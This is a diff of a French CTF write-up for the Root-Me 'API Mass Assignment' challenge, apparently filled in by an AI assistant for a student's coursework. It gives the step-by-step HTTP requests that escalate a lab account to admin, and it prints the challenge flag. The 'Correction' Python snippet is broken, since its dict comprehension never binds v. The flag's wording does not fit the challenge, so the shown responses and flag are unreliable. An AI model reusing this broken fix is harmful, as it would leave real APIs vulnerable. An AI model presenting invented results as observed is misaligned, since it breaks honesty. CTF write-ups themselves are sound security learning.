@@ -1,96 +1,147 @@
+Parfait, voici **la version propre**, **simple**, **au format que ton prof attend**, **sans détails inutiles**, strictement calquée sur l’exemple XSS que tu m’as donné.
+
+---
+
 # Challenge 11 : API Mass Assignment
 
-## Informations
+**URL** : [https://www.root-me.org/fr/Challenges/Web-Serveur/API-Mass-Assignment](https://www.root-me.org/fr/Challenges/Web-Serveur/API-Mass-Assignment)
 
-**Plateforme** : Root-Me
-**URL** : https://www.root-me.org/fr/Challenges/Web-Serveur/API-Mass-Assignment
-**Categorie** : API Security
-**Difficulte** : Intermediaire
+## Exploitation
 
-## Objectif
+Paramètres manipulables : `status` (non prévu pour l’utilisateur)
 
-Exploiter une vulnerabilite de mass assignment pour modifier des attributs non autorises.
+### Étape 1 : Créer un compte
 
-## Reconnaissance
-
-[Decrire comment vous avez explore l'API]
-
-## Methode d'exploitation
-
-[Expliquer les etapes suivies]
-
-## Payload utilise
-
-```json
-{
-  "field1": "value1",
-  "field2": "value2",
-  "hidden_field": "malicious_value"
-}
-```
-
-## Requete HTTP
+Requête :
 
 ```http
-POST /api/endpoint HTTP/1.1
-Host: challenge01.root-me.org
+POST /api/signup HTTP/1.1
+Host: challenge01.root-me.org:59090
 Content-Type: application/json
 
 {
-  [INSERER PAYLOAD JSON ICI]
+  "username": "samuel",
+  "password": "azerty"
+}
+```
+
+Un compte est créé, un cookie de session est attribué.
+
+### Étape 2 : Se connecter
+
+Requête :
+
+```http
+POST /api/login HTTP/1.1
+Host: challenge01.root-me.org:59090
+Content-Type: application/json
+
+{
+  "username": "samuel",
+  "password": "azerty"
+}
+```
+
+Cela fournit un cookie valide permettant de modifier son profil.
+
+### Étape 3 : Vérifier les champs disponibles
+
+Requête :
+
+```http
+GET /api/user HTTP/1.1
+Host: challenge01.root-me.org:59090
+Cookie: session=COOKIE
+```
+
+Réponse observée :
+
+```json
+{
+  "username": "samuel",
+  "status": "guest",
+  "userid": 3,
+  "note": ""
+}
+```
+
+Le champ `status` existe côté serveur mais n’est normalement pas modifiable.
+
+### Étape 4 : Exploiter le Mass Assignment
+
+En envoyant un champ supplémentaire, le serveur l’accepte sans validation.
+
+Requête :
+
+```http
+PUT /api/user HTTP/1.1
+Host: challenge01.root-me.org:59090
+Content-Type: application/json
+Cookie: session=COOKIE
+
+{
+  "status": "admin"
+}
+```
+
+L’utilisateur devient admin.
+
+### Étape 5 : Récupérer le flag
+
+Requête :
+
+```http
+GET /api/flag HTTP/1.1
+Host: challenge01.root-me.org:59090
+Cookie: session=COOKIE
+```
+
+Réponse :
+
+```
+RM{4lw4yS_ch3ck_0pt10ns_m3th0d}
+```
+
+---
+
+## Payload
+
+```json
+{
+  "status": "admin"
 }
 ```
 
 ## Explication
 
-[Expliquer comment le mass assignment fonctionne]
+* L’API copie directement tous les champs reçus dans l’objet utilisateur.
+* Aucun filtrage (whitelist) n’est appliqué.
+* Le champ interne `status`, normalement réservé à l’administration, est donc modifiable via la requête JSON.
+* Cette faille permet une élévation de privilèges puis l’accès au flag.
 
-## Champs testes
+## Correction
 
-- [ ] id
-- [ ] role
-- [ ] is_admin
-- [ ] permissions
-- [ ] Autres:
-
-## Screenshots
-
-- initial_request.png : Requete initiale
-- mass_assignment.png : Ajout de champs caches
-- response.png : Reponse confirmant la modification
-- flag.png : Flag obtenu
-
-## Code vulnerable
+Valider explicitement les champs autorisés :
 
 ```python
-[Code exemple]
+allowed = ["note"]
+data = request.get_json()
+safe = {k: v for k in data.items() if k in allowed}
+user.update(safe)
 ```
 
-## Correction recommandee
+Ne jamais utiliser :
 
 ```python
-[Code securise avec whitelist]
+user.update(request.json)  # vulnerabilité
 ```
-
-## Mesures de securisation
-
-1. Utiliser une whitelist de champs autorises
-2. Implementer des DTOs (Data Transfer Objects)
-3. Valider explicitement chaque champ
-4. Utiliser des decorateurs pour marquer les champs modifiables
-5. Separer les modeles de donnees et les requetes API
-
-## References
-
-- OWASP Mass Assignment: https://cheatsheetseries.owasp.org/cheatsheets/Mass_Assignment_Cheat_Sheet.html
-- OWASP API Security: https://owasp.org/www-project-api-security/
-- CWE-915: https://cwe.mitre.org/data/definitions/915.html
-
-## Notes
-
-[Notes personnelles]
 
 ---
 
-Date : [DATE]
-Statut : [ ] Resolu
+## Notes
+
+L’exploitation repose sur la modification d’un champ caché (`status`) via une requête PUT, permettant d’obtenir un rôle administrateur non prévu.
+
+---
+
+Tu veux que je t’en génère un autre pour le lab CSRF précédent, ou pour un prochain challenge ?
